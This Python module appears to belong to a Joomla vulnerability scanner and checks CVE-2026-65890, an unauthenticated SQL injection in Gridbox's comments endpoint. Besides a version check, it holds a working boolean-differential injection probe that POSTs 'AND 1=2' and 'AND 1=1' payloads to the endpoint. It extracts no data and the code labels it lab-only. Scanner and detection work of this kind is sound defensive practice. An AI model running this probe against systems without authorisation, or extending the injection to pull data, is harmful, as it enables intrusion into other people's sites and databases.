from __future__ import annotations

from typing import Any

from ...core.http import HttpClient, form_encode, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from . import gridbox_common as gb

CVE_ID = "CVE-2026-65890"
NAME = "Gridbox unauthenticated SQL injection in comments"
COMPONENT = "Gridbox (com_gridbox)"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["aggressive"]
AFFECTED_JOOMLA_VERSIONS = ["*"]
AFFECTED_RULE = "Gridbox 1.0.0 through 2.20.1"
FIXED_RULE = "Gridbox 2.20.2 or later"
COMMENTS_PATH = "/index.php?option=com_gridbox&task=comments.getCommentsPatterns"


def run_aggressive_probe(
    target_url: str,
    timeout: int = 12,
    proxy: str | None = None,
    page_id: str = "900001",
) -> Finding:
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    preflight = client.get(f"{base}/", timeout=timeout)
    if is_transport_error(preflight):
        return Finding(
            cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True, proof_url=f"{base}/",
            detail=f"The target could not be reached ({transport_error_detail(preflight)}).",
            action="Retry when the target is reachable.",
        )

    def comments(payload: str) -> dict[str, Any]:
        return client.request(
            f"{base}{COMMENTS_PATH}", method="POST",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=form_encode({"id": payload}), timeout=timeout, follow_redirects=False,
        )

    false_resp = comments(f"{page_id} AND 1=2")
    true_resp = comments(f"{page_id} AND 1=1")
    false_body = false_resp.get("body", "") or ""
    true_body = true_resp.get("body", "") or ""
    false_empty = "Be the first to comment" in false_body or '"comments":""' in false_body
    true_has_comments = not ("Be the first to comment" in true_body) and "comments" in true_body
    differential = false_empty and true_has_comments and false_body != true_body
    evidence: dict[str, object] = {
        "page_id": page_id,
        "false_status": false_resp.get("status"),
        "true_status": true_resp.get("status"),
        "false_empty": false_empty,
        "true_has_comments": true_has_comments,
        "false_length": len(false_body),
        "true_length": len(true_body),
    }
    if differential:
        return Finding(
            cve=CVE_ID, name=NAME, status="VULNERABLE", confidence="CONFIRMED",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}{COMMENTS_PATH}",
            evidence=evidence,
            detail=(
                f"The unauthenticated comments endpoint concatenated the POST id into SQL: "
                f"'{page_id} AND 1=2' returned an empty comment set while '{page_id} AND 1=1' "
                "returned the approved comment. The probe used a boolean differential only; "
                "no data was extracted."
            ),
            action=(
                "Upgrade Gridbox to 2.20.2 or later (integer casts and array filters) and review "
                "database access logs for injected comment queries."
            ),
        )
    return Finding(
        cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM",
        component=COMPONENT, affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT, exploit_ran=True,
        proof_url=f"{base}{COMMENTS_PATH}",
        evidence=evidence,
        detail=(
            "The boolean payloads did not produce the expected differential "
            f"(false_empty={false_empty}, true_has_comments={true_has_comments})."
        ),
        action="Verify Gridbox runs 2.20.2 or later.",
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    plugins: dict | None = None,
    **kwargs: Any,
) -> Finding:
    result = gb.passive_gridbox(
        plugins,
        cve=CVE_ID, name=NAME, component=COMPONENT, affected_rule=AFFECTED_RULE,
        fixed_rule=FIXED_RULE, fixed="2.20.2",
        affected_detail="Gridbox is in the affected range; verify the unauthenticated comments SQLi boolean differential.",
        patched_detail="Gridbox casts the comments page id to int and filters the category/tag arrays.",
        action="Upgrade Gridbox to 2.20.2 or later and review database logs.",
    )
    if not run_exploit_check:
        return result
    if exploit_mode != "aggressive":
        result.detail += " This CVE requires an aggressive lab-only boolean SQLi proof."
        return result
    if result.status not in {"LIKELY_VULNERABLE", "INCONCLUSIVE"}:
        return result
    args = aggressive_args or {}
    probe = run_aggressive_probe(
        target_url, timeout=timeout, proxy=proxy,
        page_id=str(args.get("page_id") or "900001"),
    )
    probe.component_version = result.component_version
    return probe


def affects_joomla_version(joomla_version: str | None) -> bool:
    return True


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT,
        "affected_rule": AFFECTED_RULE, "affected_joomla_versions": AFFECTED_JOOMLA_VERSIONS,
        "exploit_available": HAS_EXPLOIT, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE,
        "vulnerability_type": "SQL Injection",
        "module_version": "1.0.0", "last_reviewed": "2026-11-11", "updated": "2026-11-11",
        "required_detectors": ["gridbox"],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2026-65890",
            "https://mysites.guru/blog/gridbox-23-critical-vulnerabilities/",
        ],
    }
